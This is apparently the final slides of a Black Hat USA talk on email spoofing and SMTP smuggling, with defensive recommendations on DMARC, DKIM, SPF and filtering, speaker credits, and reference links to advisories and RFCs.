v **Enforce DMARC, DKIM, and SPF** : Despite potential bypass techniques, implementing these controls is crucial for verifying email **authenticity** and reducing phishing and spoofing risks.

- v **Utilize Advanced Email Filtering** : Employ heuristic and content-based email filtering solutions alongside DMARC, DKIM, and SPF **validation** to more effectively identify and block spoofing and phishing emails.

- v **Adhere to RFC Standards** : All email service providers should **enforce** RFC standards for authentication and authorization by preventing unauthorized email sending and verifying email authenticity.

#BHUSA @BlackHatEvents

## Slide 69

## Questions?

#BHUSA @BlackHatEvents

## Slide 70

### Thanks

Caleb Sargent Offensive Security Engineer (@squared_)

Hao Wang Offensive Security Manager (@MrRed_Panda)

Support Team:

- Mika Devonshire - Speaker Coach

- • Harrison Pomeroy - SMTP smuggling detection analysis

- Michael Jabbaar - Design & Graphic support

- US CERT Team

- Renana Friedlich - Content review & project support

- Michael Wood - Content review & project support

#BHUSA @BlackHatEvents

## Slide 71

### References

###### **SMTP Smuggling**

v <u>https://sec-consult.com/blog/detail/smtp-smuggling-spoofing-e-mails-worldwide</u>

**Spamchannel Defcon 31**

v https://forum.defcon.org/node/245722

- **Dark Reading blog about our research**

- v <u>https://www.darkreading.com/threat-intelligence/20-million-trusted-domains-vulnerable-to-email-hosting-exploits</u> **CERT Blog about our research**

- v <u>https://kb.cert.org/vuls/id/244112</u>

**Weak Links in Authentication Chains: A Large-scale Analysis of Email Sender Spoofing Attacks**

- v <u>https://www.darkreading.com/threat-intelligence/20-million-trusted-domains-vulnerable-to-email-hosting-exploits</u> **US Cisco Smuggling Response**

- v <u>https://www.cisco.com/c/en/us/support/docs/security/email-security-appliance-c690x/221533-response-to-ciscosecure-email-smtp-smug.html</u>

#BHUSA @BlackHatEvents

## Slide 72

### References

**RFC - Internet Message Format** vhttps://datatracker.ietf.org/doc/html/rfc2822 vhttps://datatracker.ietf.org/doc/html/rfc5322 vhttps://datatracker.ietf.org/doc/html/rfc5321 vhttps://datatracker.ietf.org/doc/html/rfc7489 vhttps://datatracker.ietf.org/doc/html/rfc7208 vhttps://datatracker.ietf.org/doc/html/rfc6409

#BHUSA @BlackHatEvents

## Slide 73

### References

vhttps://serverfault.com/questions/723911/setting-up-an-spf-record-for-a- <u>shared-hosting-service-with-lots-of-email-gateway</u> vhttps://github.com/zehm/sendEmail vhttps://mailtrap.io/blog/email-feedback-loop/

vhttps://www.twilio.com/docs/sendgrid/ui/account-and-settings/spf-records vhttps://support.google.com/a/answer/6254652

#BHUSA @BlackHatEvents
